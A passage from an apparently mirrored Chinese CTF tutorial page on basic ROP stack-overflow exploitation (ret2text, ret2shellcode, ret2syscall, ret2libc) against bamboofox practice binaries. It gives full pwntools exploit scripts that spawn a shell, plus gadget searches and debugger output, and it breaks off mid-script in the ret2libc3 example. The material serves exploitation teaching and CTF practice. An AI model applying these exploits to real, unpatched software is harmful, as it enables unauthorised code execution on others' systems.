gets(buf);\n───────────────────────────────────────────────────────────────────────[ registers ]────\n$eax   : 0xffffcd5c  →  0x08048329  →  \"__libc_start_main\"\n$ebx   : 0x00000000\n$ecx   : 0xffffffff\n$edx   : 0xf7faf870  →  0x00000000\n$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  \"__libc_start_main\"\n$ebp   : 0xffffcdc8  →  0x00000000\n$esi   : 0xf7fae000  →  0x001b1db0\n$edi   : 0xf7fae000  →  0x001b1db0\n$eip   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此，我们可以推断</p>\n<ul>\n<li>s 的地址为 0xffffcd5c</li>\n<li>s 相对于 ebp 的偏移为 0x6c</li>\n<li>s 相对于返回地址的偏移为 0x6c+4</li>\n</ul>\n<p>最后的 payload 如下：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">##!/usr/bin/env python\nfrom pwn import *\n\nsh = process('./ret2text')\ntarget = 0x804863a\nsh.sendline('A' * (0x6c+4) + p32(target))\nsh.interactive()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"ret2shellcode¶\"><a href=\"#ret2shellcode¶\" class=\"headerlink\" title=\"ret2shellcode¶\"></a>ret2shellcode<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI3JldDJzaGVsbGNvZGU=\">¶</span></h2><h3 id=\"原理-¶-1\"><a href=\"#原理-¶-1\" class=\"headerlink\" title=\"原理 ¶\"></a>原理 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18z\">¶</span></h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p>\n<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>\n<h3 id=\"例子-¶-1\"><a href=\"#例子-¶-1\" class=\"headerlink\" title=\"例子 ¶\"></a>例子 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI180\">¶</span></h3><p>这里我们以 bamboofox 中的 ret2shellcode 为例</p>\n<p>点击下载: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MnNoZWxsY29kZS9yZXQyc2hlbGxjb2RlLWV4YW1wbGUvcmV0MnNoZWxsY29kZQ==\">ret2shellcode</span></p>\n<p>首先检测程序开启的保护</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">➜  ret2shellcode checksec ret2shellcode\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x8048000)\n    RWX:      Has RWX segments<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-64h]@1\n\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stdin, 0, 1, 0);\n  puts(\"No system for you this time !!!\");\n  gets((char *)&amp;v4);\n  strncpy(buf2, (const char *)&amp;v4, 0x64u);\n  printf(\"bye bye ~\");\n  return 0;\n}<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">.bss:0804A080                 public buf2\n.bss:0804A080 ; char buf2[100]<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">gef➤  b main\nBreakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.\ngef➤  r\nStarting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode \n\nBreakpoint 1, main () at ret2shellcode.c:8\n8       setvbuf(stdout, 0LL, 2, 0LL);\n─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────\n      6  int main(void)\n      7  {\n →    8      setvbuf(stdout, 0LL, 2, 0LL);\n      9      setvbuf(stdin, 0LL, 1, 0LL);\n     10  \n─────────────────────────────────────────────────────────────────────[ trace ]────\n[#0] 0x8048536 → Name: main()\n─────────────────────────────────────────────────────────────────────────────────────────────────────\ngef➤  vmmap \nStart      End        Offset     Perm Path\n0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so\n0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\n0xf7faf000 0xf7fb2000 0x00000000 rwx \n0xf7fd3000 0xf7fd5000 0x00000000 rwx \n0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]\n0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]\n0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffb000 0xf7ffc000 0x00000000 rwx \n0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\n0xfffdd000 0xffffe000 0x00000000 rwx [stack]<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p>\n<p>具体的 payload 如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">#!/usr/bin/env python\nfrom pwn import *\n\nsh = process('./ret2shellcode')\nshellcode = asm(shellcraft.sh())\nbuf2_addr = 0x804a080\n\nsh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))\nsh.interactive()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"题目-¶\"><a href=\"#题目-¶\" class=\"headerlink\" title=\"题目 ¶\"></a>题目 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI181\">¶</span></h3><ul>\n<li>sniperoj-pwn100-shellcode-x86-64</li>\n</ul>\n<h2 id=\"ret2syscall¶\"><a href=\"#ret2syscall¶\" class=\"headerlink\" title=\"ret2syscall¶\"></a>ret2syscall<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI3JldDJzeXNjYWxs\">¶</span></h2><h3 id=\"原理-¶-2\"><a href=\"#原理-¶-2\" class=\"headerlink\" title=\"原理 ¶\"></a>原理 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI182\">¶</span></h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>\n<h3 id=\"例子-¶-2\"><a href=\"#例子-¶-2\" class=\"headerlink\" title=\"例子 ¶\"></a>例子 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI183\">¶</span></h3><p>这里我们以 bamboofox 中的 ret2syscall 为例</p>\n<p>点击下载: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MnN5c2NhbGwvYmFtYm9vZm94LXJldDJzeXNjYWxsL3JvcA==\">ret2syscall</span></p>\n<p>首先检测程序开启的保护</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">➜  ret2syscall checksec rop\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-64h]@1\n\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stdin, 0, 1, 0);\n  puts(\"This time, no system() and NO SHELLCODE!!!\");\n  puts(\"What do you plan to do?\");\n  gets(&amp;v4);\n  return 0;\n}<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JUIzJUJCJUU3JUJCJTlGJUU4JUIwJTgzJUU3JTk0JUE4\">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</span></li>\n</ul>\n<p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">execve(\"/bin/sh\",NULL,NULL)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>其中，该程序是 32 位，所以我们需要使得</p>\n<ul>\n<li>系统调用号，即 eax 应该为 0xb</li>\n<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>\n<li>第二个参数，即 ecx 应该为 0</li>\n<li>第三个参数，即 edx 应该为 0</li>\n</ul>\n<p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p>\n<p>首先，我们来寻找控制 eax 的 gadgets</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n0x080bb196 : pop eax ; ret\n0x0807217a : pop eax ; ret 0x80e\n0x0804f704 : pop eax ; ret 3\n0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。</p>\n<p>类似的，我们可以得到控制其它寄存器的 gadgets</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'\n0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret\n0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret\n0x080be23f : pop ebx ; pop edi ; ret\n0x0806eb69 : pop ebx ; pop edx ; ret\n0x08092258 : pop ebx ; pop esi ; pop ebp ; ret\n0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10\n0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14\n0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc\n0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4\n0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8\n0x08048913 : pop ebx ; pop esi ; pop edi ; ret\n0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4\n0x08049a94 : pop ebx ; pop esi ; ret\n0x080481c9 : pop ebx ; ret\n0x080d7d3c : pop ebx ; ret 0x6f9\n0x08099c87 : pop ebx ; ret 8\n0x0806eb91 : pop ecx ; pop ebx ; ret\n0x0806336b : pop edi ; pop esi ; pop ebx ; ret\n0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret\n0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret\n0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret\n0x0805c820 : pop esi ; pop ebx ; ret\n0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x0807b6ed : pop ss ; pop ebx ; ret<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里，我选择</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这个可以直接控制其它三个寄存器。</p>\n<p>此外，我们需要获得 /bin/sh 字符串对应的地址。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">➜  ret2syscall ROPgadget --binary rop  --string '/bin/sh' \nStrings information\n============================================================\n0x080be408 : /bin/sh<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">➜  ret2syscall ROPgadget --binary rop  --only 'int'                 \nGadgets information\n============================================================\n0x08049421 : int 0x80\n0x080938fe : int 0xbb\n0x080869b5 : int 0xf6\n0x0807b4d4 : int 0xfc\n\nUnique gadgets found: 4<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>同时，也找到对应的地址了。</p>\n<p>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">#!/usr/bin/env python\nfrom pwn import *\n\nsh = process('./rop')\n\npop_eax_ret = 0x080bb196\npop_edx_ecx_ebx_ret = 0x0806eb90\nint_0x80 = 0x08049421\nbinsh = 0x80be408\npayload = flat(\n    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])\nsh.sendline(payload)\nsh.interactive()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"题目-¶-1\"><a href=\"#题目-¶-1\" class=\"headerlink\" title=\"题目 ¶\"></a>题目 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI184\">¶</span></h3><h2 id=\"ret2libc¶\"><a href=\"#ret2libc¶\" class=\"headerlink\" title=\"ret2libc¶\"></a>ret2libc<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI3JldDJsaWJj\">¶</span></h2><h3 id=\"原理-¶-3\"><a href=\"#原理-¶-3\" class=\"headerlink\" title=\"原理 ¶\"></a>原理 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI185\">¶</span></h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>\n<h3 id=\"例子-¶-3\"><a href=\"#例子-¶-3\" class=\"headerlink\" title=\"例子 ¶\"></a>例子 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18xMA==\">¶</span></h3><p>我们由简单到难分别给出三个例子。</p>\n<h4 id=\"例-1¶\"><a href=\"#例-1¶\" class=\"headerlink\" title=\"例 1¶\"></a>例 1<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvIzE=\">¶</span></h4><p>这里我们以 bamboofox 中 ret2libc1 为例</p>\n<p>点击下载: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MmxpYmMvcmV0MmxpYmMxL3JldDJsaWJjMQ==\">ret2libc1</span></p>\n<p>首先，我们可以检查一下程序的安全保护</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">➜  ret2libc1 checksec ret2libc1    \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-64h]@1\n\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(_bss_start, 0, 1, 0);\n  puts(\"RET2LIBC &gt;_&lt;\");\n  gets((char *)&amp;v4);\n  return 0;\n}<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          \nStrings information\n============================================================\n0x08048720 : /bin/sh<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">#!/usr/bin/env python\nfrom pwn import *\n\nsh = process('./ret2libc1')\n\nbinsh_addr = 0x8048720\nsystem_plt = 0x08048460\npayload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])\nsh.sendline(payload)\n\nsh.interactive()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p>\n<p>这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。</p>\n<h4 id=\"例-2¶\"><a href=\"#例-2¶\" class=\"headerlink\" title=\"例 2¶\"></a>例 2<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvIzI=\">¶</span></h4><p>这里以 bamboofox 中的 ret2libc2 为例</p>\n<p>点击下载: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MmxpYmMvcmV0MmxpYmMyL3JldDJsaWJjMg==\">ret2libc2</span></p>\n<p>该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”)。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">##!/usr/bin/env python\nfrom pwn import *\n\nsh = process('./ret2libc2')\n\ngets_plt = 0x08048460\nsystem_plt = 0x08048490\npop_ebx = 0x0804843d\nbuf2 = 0x804a080\npayload = flat(\n    ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])\nsh.sendline(payload)\nsh.sendline('/bin/sh')\nsh.interactive()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>需要注意的是，我这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。</p>\n<h4 id=\"例-3¶\"><a href=\"#例-3¶\" class=\"headerlink\" title=\"例 3¶\"></a>例 3<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvIzM=\">¶</span></h4><p>这里以 bamboofox 中的 ret2libc3 为例</p>\n<p>点击下载: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MmxpYmMvcmV0MmxpYmMzL3JldDJsaWJjMw==\">ret2libc3</span></p>\n<p>在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">➜  ret2libc3 checksec ret2libc3\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-64h]@1\n\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stdin, 0, 1, 0);\n  puts(\"No surprise anymore, system disappeard QQ.\");\n  printf(\"Can you find it !?\");\n  gets((char *)&amp;v4);\n  return 0;\n}<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p>\n<ul>\n<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>\n<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25pa2xhc2IvbGliYy1kYXRhYmFzZQ==\">https://github.com/niklasb/libc-database</span></li>\n</ul>\n<p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p>\n<p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p>\n<p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xpZWFudS9MaWJjU2VhcmNoZXI=\">https://github.com/lieanu/LibcSearcher</span></li>\n</ul>\n<p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p>\n<p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p>\n<ul>\n<li>泄露 __libc_start_main 地址</li>\n<li>获取 libc 版本</li>\n<li>获取 system 地址与 /bin/sh 的地址</li>\n<li>再次执行源程序</li>\n<li>触发栈溢出执行 system(‘/bin/sh’)</li>\n</ul>\n<p>exp 如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">#!/usr/bin/env python\nfrom pwn import *\nfrom LibcSearcher import LibcSearcher\nsh = process('./ret2libc3')\n\nret2libc3 = ELF('./ret2libc3')\n\nputs_plt = ret2libc3.plt['puts']\nlibc_start_main_got = ret2libc3.got['__libc_start_main']\nmain = ret2libc3.symbols['main']\n\nprint \"leak libc_start_main_got addr and return to main again\"\npayload = flat(['A' * 112, puts_plt, main, libc_start_main_got])\nsh.sendlineafter('Can you find it !?', payload)\n\nprint \"get the related addr\"\nlibc_start_main_addr = u32(sh.recv()[0:4])\nlibc = LibcSearcher('__libc_start_main', 